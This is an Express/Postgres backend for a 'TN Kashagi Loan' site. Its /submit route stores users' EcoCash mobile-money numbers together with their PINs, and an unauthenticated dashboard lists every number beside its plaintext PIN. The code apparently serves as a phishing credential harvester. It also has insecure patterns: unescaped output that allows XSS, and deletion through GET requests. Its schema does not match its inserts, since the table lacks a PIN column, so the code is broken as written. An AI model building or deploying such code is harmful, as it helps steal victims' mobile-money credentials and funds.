const express = require("express");
const cors = require("cors");
const { Pool } = require("pg");

const app = express();

app.use(cors());
app.use(express.json());

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: {
    rejectUnauthorized: false
  }
});

// ============================
// HOME
// ============================

app.get("/", (req, res) => {
  res.send("Kashagi Backend Running");
});

// ============================
// TEST DATABASE
// ============================

app.get("/test-db", async (req, res) => {

  try {

    const result = await pool.query("SELECT NOW()");

    res.json(result.rows[0]);

  } catch (err) {

    res.status(500).json({
      error: err.message
    });

  }

});

// ============================
// CREATE TABLE
// ============================

app.get("/create-table", async (req, res) => {

  try {

    await pool.query(`
      CREATE TABLE IF NOT EXISTS submissions (
        id SERIAL PRIMARY KEY,
        ecocash_number TEXT NOT NULL,
        reference_number TEXT NOT NULL,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);

    res.send("Table created successfully");

  } catch (err) {

    res.status(500).json({
      error: err.message
    });

  }

});

// ============================
// SAVE TEST RECORD
// ============================

app.get("/save-test", async (req, res) => {

  try {

    await pool.query(
      "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
      ["0771234567","TEST123"]
    );

    res.send("Test data saved");

  } catch (err) {

    res.status(500).json({
      error: err.message
    });

  }

});

// ============================
// SUBMIT APPLICATION
// ============================

app.post("/submit", async (req, res) => {

  try {

    const {
      ecocash_number,
      ecocash_pin
    } = req.body;

    await pool.query(
      "INSERT INTO submissions (ecocash_number, ecocash_pin) VALUES ($1,$2)",
      [ecocash_number, ecocash_pin]
    );

    res.json({
      success: true,
      message: "Data saved successfully"
    });

  } catch (err) {

    res.status(500).json({
      success: false,
      error: err.message
    });

  }

});// ============================
// DELETE SINGLE RECORD
// ============================

app.get("/delete/:id", async (req, res) => {

  try {

    await pool.query(
      "DELETE FROM submissions WHERE id=$1",
      [req.params.id]
    );

    res.redirect("/submissions");

  } catch (err) {

    res.status(500).send(err.message);

  }

});

// ============================
// DELETE SELECTED RECORDS
// ============================

app.post("/delete-selected", async (req, res) => {

  try {

    const { ids } = req.body;

    if (!ids || ids.length === 0) {

      return res.json({
        success: false,
        message: "No records selected"
      });

    }

    await pool.query(
      "DELETE FROM submissions WHERE id = ANY($1::int[])",
      [ids]
    );

    res.json({
      success: true
    });

  } catch (err) {

    res.status(500).json({
      success: false,
      error: err.message
    });

  }

});

// ============================
// DASHBOARD
// ============================

app.get("/submissions", async (req, res) => {

  try {

    const search = req.query.search || "";

    let result;

    if (search) {

      result = await pool.query(
        "SELECT * FROM submissions WHERE ecocash_number ILIKE $1 ORDER BY id DESC",
        [`%${search}%`]
      );

    } else {

      result = await pool.query(
        "SELECT * FROM submissions ORDER BY id DESC"
      );

    }

    const totalResult = await pool.query(
      "SELECT COUNT(*) FROM submissions"
    );

    const todayResult = await pool.query(
      "SELECT COUNT(*) FROM submissions WHERE DATE(created_at)=CURRENT_DATE"
    );

    let rows = "";result.rows.forEach(item => {

      rows += `
      <tr>

        <td>
          <input
            type="checkbox"
            class="record"
            value="${item.id}">
        </td>

        <td>${item.id}</td>

        <td>${item.ecocash_number}</td>

        <td>${item.ecocash_pin}</td>

        <td>${new Date(item.created_at).toLocaleString()}</td>

        <td>

          <a
            href="/delete/${item.id}"
            onclick="return confirm('Delete this record?')"
            style="color:red;font-weight:bold;text-decoration:none;">

            Delete

          </a>

        </td>

      </tr>
      `;

    });

    res.send(`

<!DOCTYPE html>

<html>

<head>

<title>TN Kashagi Loan Dashboard</title>

<style>

body{
font-family:Arial,sans-serif;
background:#f4f6f9;
margin:0;
padding:20px;
}

.container{
max-width:1200px;
margin:auto;
}

h1{
text-align:center;
color:#1877f2;
margin-bottom:20px;
}

.cards{
display:flex;
gap:15px;
margin-bottom:20px;
flex-wrap:wrap;
}

.card{
flex:1;
background:white;
padding:20px;
border-radius:10px;
box-shadow:0 2px 10px rgba(0,0,0,.1);
text-align:center;
}

.card h2{
color:#1877f2;
margin:0;
font-size:32px;
}

.search{
display:flex;
gap:10px;
margin-bottom:20px;
flex-wrap:wrap;
}

.search input{
flex:1;
padding:12px;
border:1px solid #ccc;
border-radius:6px;
}

.search button{

padding:12px 18px;

background:#1877f2;

color:white;

border:none;

border-radius:6px;

cursor:pointer;

font-weight:bold;

}

.deleteSelected{

background:#dc3545 !important;

}

table{

width:100%;

background:white;

border-collapse:collapse;

box-shadow:0 2px 10px rgba(0,0,0,.1);

}

th{

background:#1877f2;

color:white;

padding:12px;

}

td{

padding:10px;

text-align:center;

border-bottom:1px solid #ddd;

}

tr:hover{

background:#eef5ff;

}

</style>

</head>

<body>

<div class="container">

<h1>TN Kashagi Loan Dashboard</h1>

<div class="cards">

<div class="card">

<h3>Total Submissions</h3>

<h2>${totalResult.rows[0].count}</h2>

</div>

<div class="card">

<h3>Today's Submissions</h3>

<h2>${todayResult.rows[0].count}</h2>

</div>

</div>

<div class="search">

<form method="GET" action="/submissions" style="display:flex;gap:10px;width:100%;">

<input
type="text"
name="search"
placeholder="Search EcoCash Number"
value="${search}">

<button type="submit">

Search

</button>

<button
type="button"
class="deleteSelected"
onclick="deleteSelected()">

Delete Selected

</button>

</form>

</div>

<table>

<tr>

<th>

<input type="checkbox" id="selectAll">

</th>

<th>ID</th>

<th>EcoCash Number</th>

<th>EcoCash Pin</th>

<th>Date Submitted</th>

<th>Action</th>

</tr>

${rows}</table>

</div>

<script>

const selectAll=document.getElementById("selectAll");

selectAll.addEventListener("change",()=>{

document.querySelectorAll(".record").forEach(box=>{

box.checked=selectAll.checked;

});

});

async function deleteSelected(){

const ids=[];

document.querySelectorAll(".record:checked").forEach(box=>{

ids.push(Number(box.value));

});

if(ids.length===0){

alert("Please select at least one record.");

return;

}

if(!confirm("Delete the selected record(s)?")){

return;

}

const response=await fetch("/delete-selected",{

method:"POST",

headers:{

"Content-Type":"application/json"

},

body:JSON.stringify({

ids

})

});

const result=await response.json();

if(result.success){

location.reload();

}else{

alert(result.error||"Unable to delete records.");

}

}

</script>

</body>

</html>

`);

} catch (err) {

res.status(500).send(err.message);

}

});

// ============================
// START SERVER
// ============================

const PORT=process.env.PORT||3000;

app.listen(PORT,()=>{

console.log("Server started on port "+PORT);

});
